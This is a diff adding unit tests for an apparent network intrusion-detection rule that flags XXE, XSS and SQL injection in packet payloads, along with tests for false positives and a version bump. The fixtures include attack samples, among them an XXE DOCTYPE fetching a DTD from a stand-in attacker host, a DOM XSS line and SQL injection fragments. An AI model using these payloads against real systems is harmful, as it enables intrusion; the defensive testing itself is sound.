@@ -76,6 +76,35 @@ class TestPayloadRule(unittest.TestCase):
         self.assertIsNotNone(alert)
         self.assertIn("XXE", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
+    def test_external_doctype_xxe_still_fires(self):
+        alert = self.rule.check(self.packet(
+            b'POST /xml HTTP/1.1\r\n\r\n<!DOCTYPE x SYSTEM "http://attacker.test/evil.dtd"><x/>',
+            8050, src_port=40008))
+        self.assertIsNotNone(alert)
+        self.assertIn("XXE", [hit["signature"] for hit in alert["evidence"]["hits"]])
+
+    def test_standard_html_public_doctype_is_not_xxe(self):
+        alert = self.rule.check(self.packet(
+            b'Content-Type: text/html\r\n\r\n'
+            b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" '
+            b'"http://www.w3.org/TR/REC-html40/loose.dtd">',
+            8075, dst_port=587))
+        self.assertIsNone(alert)
+
+    def test_static_document_write_is_not_xss(self):
+        alert = self.rule.check(self.packet(
+            b'HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript\r\n\r\n'
+            b"document.write('<iframe src=\"http://ads.example/banner\"></iframe>');",
+            8080, src_port=80, dst_port=2375))
+        self.assertIsNone(alert)
+
+    def test_document_write_of_user_controlled_location_still_fires_xss(self):
+        alert = self.rule.check(self.packet(
+            b'GET /script.js HTTP/1.1\r\n\r\ndocument.write(location.search);',
+            8090))
+        self.assertIsNotNone(alert)
+        self.assertIn("XSS", [hit["signature"] for hit in alert["evidence"]["hits"]])
+
     def test_repeated_payload_signature_is_cooled_down_per_host_service(self):
         rule = PayloadRule(alert_cooldown=60)
         first = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, src_port=40009))
@@ -170,7 +199,7 @@ class TestPayloadRule(unittest.TestCase):
         suffix.update(tcp_flags=0x18, tcp_seq=1018)
         alert = self.rule.check(suffix)
         self.assertIsNotNone(alert)
-        self.assertEqual(alert["rule_version"], "1.17")
+        self.assertEqual(alert["rule_version"], "1.18")
         self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_retransmitted_syn_does_not_reset_current_tcp_stream(self):
@@ -367,6 +396,18 @@ class TestPayloadRule(unittest.TestCase):
             b"GET /search?q=admin#\r\nHost: example.test\r\n", 9260))
         self.assertIsNotNone(alert)
         self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])
+
+    def test_sql_comment_marker_at_truncated_sample_boundary_is_not_a_hit(self):
+        for marker in (b"#", b"----"):
+            for extra_len in (0, 1):
+                with self.subTest(marker=marker, extra_len=extra_len):
+                    rule = PayloadRule(max_bytes=128)
+                    prefix = b"GET /?q=admin"
+                    payload = prefix + b"A" * (128 - len(prefix) - len(marker)) + marker
+                    self.assertEqual(len(payload), 128)
+                    record = self.packet(
+                        payload, 9270, payload_len=len(payload) + extra_len)
+                    self.assertIsNone(rule.check(record))
 
     def test_new_tcp_connection_reuse_clears_tls_suppression(self):
         rule = PayloadRule(stream_timeout=30)
